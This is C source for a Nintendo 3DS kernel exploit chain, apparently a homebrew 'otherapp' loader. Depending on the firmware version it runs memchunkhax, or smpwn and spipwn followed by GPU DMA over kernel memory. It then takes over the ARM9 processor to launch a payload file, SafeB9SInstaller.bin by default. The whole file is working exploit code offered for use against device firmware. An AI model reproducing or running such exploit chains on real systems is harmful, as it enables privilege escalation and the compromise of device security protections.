#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include "lib/srv.h"
#include "lib/gsp.h"

#include "memchunkhax.h"
#include "smpwn.h"
#include "spipwn.h"
#include "kernel_gspwn.h"

#include "kernelhaxcode_3ds_bin.h"

#ifndef DEFAULT_PAYLOAD_FILE_OFFSET
#define DEFAULT_PAYLOAD_FILE_OFFSET 0
#endif
#ifndef DEFAULT_PAYLOAD_FILE_NAME
#define DEFAULT_PAYLOAD_FILE_NAME   "SafeB9SInstaller.bin"
#endif

typedef struct ExploitChainLayout {
    u8 workBuf[0x10000];
    BlobLayout blobLayout;
} ExploitChainLayout;

static Result doExploitChain(ExploitChainLayout *layout, Handle gspHandle, const char *payloadFileName, size_t payloadFileOffset)
{
    Result res = 0;

    memset(layout, 0, sizeof(ExploitChainLayout));
    memcpy(layout->blobLayout.code, kernelhaxcode_3ds_bin, kernelhaxcode_3ds_bin_size);
    khc3dsPrepareL2Table(&layout->blobLayout);

    // Ensure the entire contents of 'layout->blobLayout' are written back into main memory
    TRY(GSPGPU_FlushDataCache(gspHandle, &layout->blobLayout, sizeof(BlobLayout)));

    u8 kernelVersionMinor = KERNEL_VERSION_MINOR;
    if (kernelVersionMinor < 48) {
        // Below 9.3 -- memchunkhax
        TRY(memchunkhax(&layout->blobLayout, layout->workBuf, gspHandle));

        // https://developer.arm.com/docs/ddi0360/e/memory-management-unit/hardware-page-table-translation
        // "MPCore hardware page table walks do not cause a read from the level one Unified/Data Cache"
        gspDoFullCleanInvCacheTrick(gspHandle);
    }

#ifndef MEMCHUNKHAX_ONLY // reduces the size by around 3KB
    else {
        // 9.3 and above: use smpwn (7.x+) & spipwn (I've only bothered to put 8.x+ constants)
        // then GPU DMA over the kernel memory.

        // Exploit sm
        SmpwnContext *ctx = (SmpwnContext *)layout->workBuf;
        Handle srvHandle;
        TRY(smpwn(&srvHandle, ctx));
        //TRY(smPartiallyCleanupSmpwn(ctx));
        TRY(smRemoveRestrictions(ctx));

        // We now have access to all services, and can spawn new sessions of srv:pm
        // Exploit spi with that.
        TRY(spipwn(srvHandle));

        // We can now GPU DMA the kernel. Let's map the L2 table we have prepared
        mapL2TableViaGpuDma(&layout->blobLayout, layout->workBuf, gspHandle);

        svcCloseHandle(srvHandle);
    }
#endif

    khc3dsLcdDebug(true, 128, 64, 0);
    return khc3dsTakeover(payloadFileName, payloadFileOffset);
}

Result otherappMain(u32 paramBlkAddr)
{
    const char *arm9PayloadFileName;
    size_t arm9PayloadFileOffset;

    // Standard otherapp stuff:
    Handle gspHandle = **(Handle **)(paramBlkAddr + 0x58);

    // Custom stuff:
    u32 arm9ParamMagic = *(u32 *)(paramBlkAddr + 0xEF8);
    if (arm9ParamMagic == 0xC0DE0009) {
        arm9PayloadFileOffset = *(size_t *)(paramBlkAddr + 0xEFC);
        arm9PayloadFileName = (const char *)(paramBlkAddr + 0xF00); // max 255 characters
    } else {
        arm9PayloadFileOffset = DEFAULT_PAYLOAD_FILE_OFFSET;
        arm9PayloadFileName = DEFAULT_PAYLOAD_FILE_NAME;
    }

    ExploitChainLayout *layout = (ExploitChainLayout *)((paramBlkAddr + 0x1000) & ~0xFFF);

    return doExploitChain(layout, gspHandle, arm9PayloadFileName, arm9PayloadFileOffset);
}
